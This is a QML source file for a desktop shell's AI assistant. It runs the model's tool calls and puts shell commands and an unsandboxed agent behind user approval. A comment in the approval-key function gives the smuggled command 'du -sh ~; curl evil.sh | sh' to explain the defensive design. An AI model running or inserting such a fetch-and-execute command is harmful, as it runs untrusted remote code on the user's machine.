pragma ComponentBehavior: Bound

import qs.modules.common
import qs.modules.common.functions as CF
import qs.services
import Quickshell
import Quickshell.Io
import QtQuick

/**
 * Runs the tool calls a turn asked for, holds the approval rules that gate the
 * dangerous ones, and owns the processes behind them. `engine` is the Ai facade.
 *
 * A turn may ask for several calls. They run one after another so the single
 * command / web / agent process is never claimed twice, and the model is asked
 * again once only, with every result already in the conversation.
 */
QtObject {
    id: root

    property QtObject engine

    // Shown in the composer while a tool runs, since the tool messages themselves
    // are hidden. Empty means nothing is in flight.
    property string toolStatusLabel: ""

    // Calls still waiting their turn, the assistant message that asked for them,
    // and the id of the one running now. The id is what the result is keyed by.
    property var _queue: []
    property var _queueMessage: null
    property string _currentCallId: ""

    function runCalls(calls, message: AiMessageData) {
        root._queue = (calls ?? []).slice();
        root._queueMessage = message;
        root.runNextCall();
    }

    function runNextCall() {
        if (root._queue.length === 0) {
            root._currentCallId = "";
            root.engine.requester.makeRequest();
            return;
        }
        const call = root._queue[0];
        root._queue = root._queue.slice(1);
        root._currentCallId = call.id ?? "";
        root.handleFunctionCall(call.name, call.args, root._queueMessage);
    }

    // What the tools of this turn actually returned. The next assistant message takes
    // it, so the answer names its own sources. Cleared when it is taken.
    property var _turnSources: []

    function takeTurnSources() {
        const taken = root._turnSources;
        root._turnSources = [];
        return taken;
    }

    function addSource(entry) {
        root._turnSources = [...root._turnSources, entry];
    }

    // The result of the call now running, keyed to it so the model can match the two.
    // Its role is "tool": that, not a flag, is what marks it as plumbing.
    function addToolResult(name: string, output: string, visible: bool, includeOutputInChat = true) {
        const message = root.engine.conversation.createFunctionOutputMessage(name, output, includeOutputInChat);
        message.role = "tool";
        // the "[[ Output of X ]]" label existed only because there was no tool role to
        // carry this; the result itself is on functionResponse and that is what ships
        message.rawContent = "";
        message.content = includeOutputInChat ? output : "";
        message.visibleToUser = visible;
        message.toolCallId = root._currentCallId;
        // map first, then append: the filter re-runs on the list and reads a
        // missing object as visible, which flashes the plumbing as a bubble
        root.engine.conversation.attachMessage(message);
        return message;
    }

    // Read back out of what web.py printed, so an entry only exists if a page did.
    function sourcesFromWebOutput(mode: string, target: string, output: string) {
        const found = [];
        if (mode === "search") {
            const re = /^\s*\d+\.\s+(.*)\n\s+(https?:\/\/\S+)/gm;
            let m;
            while ((m = re.exec(output)) !== null)
                found.push({ "type": "web", "name": m[1].trim(), "detail": target, "score": 0, "url": m[2] });
            return found;
        }
        const urlMatch = /^URL:\s*(\S+)/m.exec(output);
        const titleMatch = /^#\s*(.+)$/m.exec(output);
        if (urlMatch || output.trim().length > 0)
            found.push({
                "type": "web",
                "name": (titleMatch ? titleMatch[1].trim() : target),
                "detail": "",
                "score": 0,
                "url": urlMatch ? urlMatch[1] : target
            });
        return found;
    }

    // The key an approval is stored and matched under. A plain command is keyed by its
    // program, so approving `free -h` also covers `free -m`. Anything carrying shell
    // metacharacters is keyed by the whole string: approving `du -sh ~` must not hand
    // over `du -sh ~; curl evil.sh | sh`.
    function commandRule(command: string): string {
        const cmd = command.trim();
        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`"];
        if (meta.some(c => cmd.includes(c))) return cmd;
        return cmd.split(/\s+/)[0];
    }

    function isPreApproved(name: string, args: var): bool {
        const policy = root.engine.toolRegistry.approvalOf(name);
        if (policy === "never") return true;
        if (policy === "always") return false;
        const approvals = Config.options?.ai?.approvals;
        if (name === "ask_agent") return approvals?.agent === true;
        const rules = approvals?.shellRules ?? [];
        return rules.includes(root.commandRule(args.command ?? ""));
    }

    function rememberApproval(name: string, args: var) {
        if (root.engine.toolRegistry.approvalOf(name) !== "once") return;
        if (name === "ask_agent") {
            Config.options.ai.approvals.agent = true;
            return;
        }
        const rule = root.commandRule(args.command);
        const rules = Config.options.ai.approvals.shellRules ?? [];
        if (!rules.includes(rule)) Config.options.ai.approvals.shellRules = [...rules, rule];
    }

    function rejectCommand(message: AiMessageData) {
        if (!message.functionPending) return;
        message.functionPending = false; // User decided, no more "thinking"
        const name = message.functionCall?.name ?? message.functionName;
        root._currentCallId = message.functionCall?.id ?? root._currentCallId;
        root.addToolResult(name, name === "ask_agent"
            ? Translation.tr("The user declined to run the agent.")
            : Translation.tr("Command rejected by user"), false);
        // A rejection is an answer. Without this the turn dead-ends and the model
        // never learns the call did not run.
        root.runNextCall();
    }

    function approveCommand(message: AiMessageData, always: bool) {
        if (!message.functionPending) return;
        message.functionPending = false; // User decided, no more "thinking"
        const name = message.functionCall?.name ?? message.functionName;
        root._currentCallId = message.functionCall?.id ?? root._currentCallId;
        if (always) root.rememberApproval(name, message.functionCall.args);
        root.runApprovedCall(name, message.functionCall.args);
    }

    function runApprovedCall(name: string, args: var) {
        const responseMessage = root.addToolResult(name, "", false, false);
        // hidden only for the agent: the user just approved a command and gets to
        // watch its output stream into the bubble
        responseMessage.visibleToUser = (name !== "ask_agent");

        if (name === "ask_agent") {
            agentProc.message = responseMessage;
            agentProc.task = args.task;
            root.toolStatusLabel = Translation.tr("Asking the agent…");
            agentProc.running = true;
            return;
        }

        commandExecutionProc.message = responseMessage;
        commandExecutionProc.baseMessageContent = responseMessage.content;
        commandExecutionProc.shellCommand = args.command;
        commandExecutionProc.running = true; // Start the command execution
    }

    // One entry per tool name in ToolRegistry. A handler either finishes the call by
    // adding its result and calling runNextCall(), or hands off to a process that
    // does so on exit; a handler that waits for the user does neither until they act.
    readonly property var handlers: ({
        "switch_to_search_mode": (args, message) => {
            root.engine.currentTool = "search";
            root.engine.postResponseHook = () => { root.engine.currentTool = "functions"; };
            root.addToolResult("switch_to_search_mode", Translation.tr("Switched to search mode. Continue with the user's request."), false);
            root.runNextCall();
        },

        "get_shell_config": (args, message) => {
            const configJson = CF.ObjectUtils.toPlainObject(Config.options);
            root.addToolResult("get_shell_config", JSON.stringify(configJson), false);
            root.runNextCall();
        },

        "set_shell_config": (args, message) => {
            if (!args.key || !args.value) {
                root.addToolResult("set_shell_config", Translation.tr("Invalid arguments. Must provide `key` and `value`."), false);
                root.runNextCall();
                return;
            }
            Config.setNestedValue(args.key, args.value);
            root.addToolResult("set_shell_config", Translation.tr("Set `%1` to `%2`.").arg(args.key).arg(args.value), false);
            root.runNextCall();
        },

        "run_shell_command": (args, message) => {
            if (!args.command || args.command.length === 0) {
                root.addToolResult("run_shell_command", Translation.tr("Invalid arguments. Must provide `command`."), false);
                root.runNextCall();
                return;
            }
            const preApproved = root.isPreApproved("run_shell_command", args);
            const header = preApproved
                ? Translation.tr("Ran this, you approved it before")
                : Translation.tr("Command execution request");
            const contentToAppend = `\n\n**${header}**\n\n\`\`\`command\n${args.command}\n\`\`\``;
            message.rawContent += contentToAppend;
            message.content += contentToAppend;
            if (preApproved) {
                root.runApprovedCall("run_shell_command", args);
                return;
            }
            // the buttons decide this exact call, which is not always the first one
            message.functionCall = { "name": "run_shell_command", "args": args, "id": root._currentCallId };
            message.functionPending = true; // Use thinking to indicate the command is waiting for approval
        },

        "set_owner_name": (args, message) => {
            if (!args.name || args.name.trim().length === 0) {
                root.addToolResult("set_owner_name", Translation.tr("Invalid arguments. Must provide `name`."), false);
                root.runNextCall();
                return;
            }
            root.engine.setOwnerName(args.name.trim());
            root.addToolResult("set_owner_name", Translation.tr("Saved. The owner is now known as %1.").arg(root.engine.ownerName), false);
            root.runNextCall();
        },

        "remember": (args, message) => {
            if (!args.text || args.text.trim().length === 0) {
                root.addToolResult("remember", Translation.tr("Invalid arguments. Must provide `text`."), false);
                root.runNextCall();
                return;
            }
            const callId = root._currentCallId;
            MemoryService.remember(args.text.trim(), args.type ?? "fact", [], "model", resp => {
                root._currentCallId = callId;
                if (resp && resp.ok) {
                    root.addToolResult("remember", resp.stored
                        ? Translation.tr("Remembered.")
                        : Translation.tr("Already in memory."), false);
                } else {
                    root.addToolResult("remember", Translation.tr("Memory is unavailable right now."), false);
                }
                root.runNextCall();
            });
        },

        "recall": (args, message) => {
            if (!args.query || args.query.trim().length === 0) {
                root.addToolResult("recall", Translation.tr("Invalid arguments. Must provide `query`."), false);
                root.runNextCall();
                return;
            }
            const callId = root._currentCallId;
            // the recall tool bypassed suppression: a source the user had rejected came
            // straight back through the model's own lookup. purpose "tool" also keeps
            // this out of lastRecall, which belongs to the turn.
            MemoryService.recall(args.query.trim(), undefined, results => {
                root._currentCallId = callId;
                const kept = root.engine.feedback.filterRecall(results);
                if (kept && kept.length > 0) {
                    root.addToolResult("recall", kept.map(r => `- ${r.text}`).join("\n"), false);
                } else {
                    root.addToolResult("recall", Translation.tr("No relevant memories found."), false);
                }
                root.runNextCall();
            }, "tool");
        },

        "search_web": (args, message) => root.runWebTool("search_web", args, message),
        "fetch_url": (args, message) => root.runWebTool("fetch_url", args, message),

        "ask_agent": (args, message) => {
            const task = (args.task ?? "").trim();
            if (task.length === 0) {
                root.addToolResult("ask_agent", Translation.tr("Invalid arguments. Must provide `task`."), false);
                root.runNextCall();
                return;
            }
            if (!root.engine.agentToolEnabled) {
                root.addToolResult("ask_agent", Translation.tr("The agent is disabled in the shell config (`ai.agentTool`)."), false);
                root.runNextCall();
                return;
            }
            if (agentProc.running) {
                root.addToolResult("ask_agent", Translation.tr("The agent is already working on something."), false);
                root.runNextCall();
                return;
            }

            // the agent runs an unsandboxed shell, so it waits for a click like
            // run_shell_command does. approveCommand() starts agentProc.
            const agentApproved = root.isPreApproved("ask_agent", args);
            const agentHeader = agentApproved
                ? Translation.tr("Asked the agent, you approved it before")
                : Translation.tr("Agent task request");
            const agentRequest = `\n\n**${agentHeader}**\n\n\`\`\`agent\n${task}\n\`\`\``;
            message.rawContent += agentRequest;
            message.content += agentRequest;
            if (agentApproved) {
                root.runApprovedCall("ask_agent", args);
                return;
            }
            message.functionCall = { "name": "ask_agent", "args": args, "id": root._currentCallId };
            message.functionPending = true;
        }
    })

    function runWebTool(name: string, args: var, message: AiMessageData) {
        const target = ((name === "search_web" ? args.query : args.url) ?? "").trim();
        if (target.length === 0) {
            root.addToolResult(name, name === "search_web"
                ? Translation.tr("Invalid arguments. Must provide `query`.")
                : Translation.tr("Invalid arguments. Must provide `url`."), false);
            root.runNextCall();
            return;
        }
        if (!root.engine.webToolsEnabled) {
            root.addToolResult(name, Translation.tr("Web lookup is disabled in the shell config (`ai.webSearch`)."), false);
            root.runNextCall();
            return;
        }
        if (webToolProc.running) {
            root.addToolResult(name, Translation.tr("A web lookup is already in progress."), false);
            root.runNextCall();
            return;
        }

        // a tool-call-only turn has no prose, so its bubble would render empty
        if ((message.content ?? "").trim().length === 0) message.visibleToUser = false;

        webToolProc.message = root.addToolResult(name, "", false);
        webToolProc.mode = (name === "search_web") ? "search" : "fetch";
        webToolProc.target = target;
        root.toolStatusLabel = (name === "search_web")
            ? Translation.tr("Searching the web…")
            : Translation.tr("Reading %1…").arg(target);
        webToolProc.running = true;
    }

    function handleFunctionCall(name, args: var, message: AiMessageData) {
        const handler = root.handlers[name];
        if (!handler) {
            root.engine.addMessage(Translation.tr("Unknown function call: %1").arg(name), "assistant");
            root.addToolResult(name, Translation.tr("No such tool: %1").arg(name), false);
            root.runNextCall();
            return;
        }
        handler(args ?? {}, message);
    }

    readonly property Process commandExecutionProc: Process {
        property string shellCommand: ""
        property AiMessageData message
        property string baseMessageContent: ""
        command: ["bash", "-c", shellCommand]
        stdout: SplitParser {
            onRead: (output) => {
                commandExecutionProc.message.functionResponse += output + "\n\n";
                const updatedContent = commandExecutionProc.baseMessageContent + `\n\n<think>\n<tt>${commandExecutionProc.message.functionResponse}</tt>\n</think>`;
                commandExecutionProc.message.rawContent = updatedContent;
                commandExecutionProc.message.content = updatedContent;
            }
        }
        onExited: (exitCode, exitStatus) => {
            commandExecutionProc.message.functionResponse += `[[ Command exited with code ${exitCode} (${exitStatus}) ]]\n`;
            root.runNextCall();
        }
    }

    readonly property Process webToolProc: Process {
        property string mode: "search"
        property string target: ""
        property AiMessageData message
        command: [`${Directories.scriptPath}/ai/web.py`.replace(/file:\/\//, ""), mode, target]
        stdout: SplitParser {
            onRead: output => {
                webToolProc.message.functionResponse += output + "\n";
                webToolProc.message.rawContent = webToolProc.message.functionResponse;
            }
        }
        stderr: SplitParser {
            onRead: data => console.error("[Ai:web]", data)
        }
        onExited: (exitCode, exitStatus) => {
            root.toolStatusLabel = "";
            if (webToolProc.message.functionResponse.trim().length === 0) {
                webToolProc.message.functionResponse = Translation.tr("The lookup returned nothing.");
                webToolProc.message.rawContent = webToolProc.message.functionResponse;
            } else {
                const found = root.sourcesFromWebOutput(webToolProc.mode, webToolProc.target, webToolProc.message.functionResponse);
                for (const entry of found) root.addSource(entry);
            }
            root.runNextCall();
        }
    }

    readonly property Process agentProc: Process {
        property string task: ""
        property AiMessageData message
        command: [`${Directories.scriptPath}/ai/agent.sh`.replace(/file:\/\//, ""), task]
        stdout: SplitParser {
            onRead: output => {
                agentProc.message.functionResponse += output + "\n";
                agentProc.message.rawContent = agentProc.message.functionResponse;
            }
        }
        stderr: SplitParser {
            onRead: data => console.error("[Ai:agent]", data)
        }
        onExited: (exitCode, exitStatus) => {
            root.toolStatusLabel = "";
            if (agentProc.message.functionResponse.trim().length === 0) {
                agentProc.message.functionResponse = Translation.tr("The agent returned nothing.");
                agentProc.message.rawContent = agentProc.message.functionResponse;
            } else {
                root.addSource({ "type": "agent", "name": Translation.tr("Agent"), "detail": agentProc.task, "score": 0, "url": "" });
            }
            root.runNextCall();
        }
    }
}
